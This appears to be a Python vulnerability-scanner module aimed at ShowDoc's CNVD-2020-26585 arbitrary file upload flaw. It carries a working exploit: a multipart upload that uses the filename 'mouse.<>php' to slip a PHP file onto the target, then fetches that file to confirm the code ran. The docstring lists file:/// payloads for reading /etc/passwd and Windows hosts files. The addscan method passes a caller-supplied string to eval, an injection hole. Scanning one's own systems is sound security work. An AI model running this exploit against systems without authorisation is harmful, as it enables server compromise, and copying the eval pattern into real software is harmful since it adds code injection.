#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
ShowDoc是一个API文档工具, 可以使用它来编写接口文档: https://www.showdoc.com.cn/
    ShowDoc扫描类: 
        1. ShowDoc 任意文件上传
            CNVD-2020-26585
                Payload: https://blog.csdn.net/weixin_51387754/article/details/121093802

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
file:///C:/Windows/System32/drivers/etc/hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from lib.tool import head
from thirdparty import requests
from time import sleep
import re

class ShowDoc():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ShowDoc'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cnvd_2020_26585_payloads = [
            {
                'path': 'index.php?s=/home/page/uploadImg',
                'data': '----------------------------921378126371623762173617\n'\
                        'Content-Disposition: form-data; name="editormd-image-file"; filename="mouse.<>php"\n'\
                        'Content-Type: text/plain\n'\
                        '\n'\
                        '<?php echo "cnvd/2020/26585"?>\n'\
                        '----------------------------921378126371623762173617--',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'multipart/form-data; boundary=--------------------------921378126371623762173617'
                })
            }
        ]

    def cnvd_2020_26585_scan(self, url):
        '''  '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'FileUpload'
        vul_info['vul_id'] = 'CNVD-2020-26585'
        vul_info['vul_method'] = 'POST'

        for payload in range(len(self.cnvd_2020_26585_payloads)):
            path = self.cnvd_2020_26585_payloads[payload]['path']
            data = self.cnvd_2020_26585_payloads[payload]['data']
            headers = self.cnvd_2020_26585_payloads[payload]['headers']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['headers'] = headers
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG

                file_path = re.search(r'(http){1}.*(\.php){1}', res.text)             # * 是否返回了文件路径
                if (('"success":1' in res.text) and file_path):
                    file_path = file_path.group()                                     # * 提取返回的文件路径
                    file_path = file_path.replace('\\', '')                           # * 替换反斜杠\ 改为合法url

                    res2 = requests.get(
                    file_path, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                    logger.logging(vul_info, res2.status_code, res2)                        # * LOG
                else:
                    return None
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            # except:
            #     logger.logging(vul_info, 'Error')
            #     return None

            if ('cnvd/2020/26585' in check.check_res(res2.text, 'cnvd/2020/26585')):
                results = {
                    'Target': target,
                    'Verify': file_path,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Method': vul_info['vul_method'],
                    'Payload': {
                        'Url': url,
                        'Path': path,
                        'Headers': headers,
                        'Data': data
                    }
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cnvd_2020_26585_scan, url=url)
        ]

showdoc = ShowDoc()
